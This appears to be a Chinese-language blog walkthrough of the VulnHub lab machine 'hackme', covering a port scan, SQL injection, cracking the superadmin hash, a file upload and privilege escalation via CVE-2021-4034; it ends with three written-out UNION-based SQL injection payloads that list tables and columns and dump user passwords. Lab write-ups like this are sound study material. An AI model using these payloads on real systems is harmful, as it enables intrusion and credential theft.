+++
ShowToc = true
TocOpen = true
title = '0x045 hackme'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# 端口扫描

![](/vulnhub_img/WEBRESOURCEd1cbf554d8355862b3021bb89beeff36image.png)

![](/vulnhub_img/WEBRESOURCEfbe85a19601dd4ab45658e125c479a22image.png)

# 渗透

![](/vulnhub_img/WEBRESOURCE2ca59bd6ad66b614526f86153da62412image.png)

注册一个账号：

登录：

![](/vulnhub_img/WEBRESOURCEf01c1126efd226c4623af26d1209548eimage.png)

这里说来惭愧，又是因为懒病，放弃了手动注入，：

![](/vulnhub_img/WEBRESOURCE131691fd40e674bf20ece71bbd03e30aimage.png)

破解superadmin的密码：

![](/vulnhub_img/WEBRESOURCE951d4c0e6f55607b087e322c763d127aimage.png)

![](/vulnhub_img/WEBRESOURCE07a00374def5f424c41f7d538c337b09image.png)

登录superadmin，发现上传框：

![](/vulnhub_img/WEBRESOURCE793b853904c8b04c69af14eeab91e1e9image.png)

![](/vulnhub_img/WEBRESOURCE02474309031324a3ef3009fd3751ae87image.png)

![](/vulnhub_img/WEBRESOURCEd021cc4c7bd9b7caef5258b5637652a2image.png)

# 提权

2021-4034

![](/vulnhub_img/WEBRESOURCEd376626b8072310083501b60ebbcddf3image.png)

SUID

![](/vulnhub_img/WEBRESOURCEa8c319e467a607c10f3e5cbe807c550bimage.png)

补一下手动注入：

Security ' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="webapphacking"#

表名：webapphacking

books,users

![](/vulnhub_img/WEBRESOURCE4b8aadd8c45cb8915003cc95318e9b9eimage.png)

列名：

Security ' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#

USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,user,pasword,name,address

![](/vulnhub_img/WEBRESOURCEa276bc3a5cc899df9c190b484f6fdedcimage.png)

Security ' union select 1,2,group_concat(USER,'\n',pasword) from users#

![](/vulnhub_img/WEBRESOURCE4effe1089c2998f430edd3c5d62346f6image.png)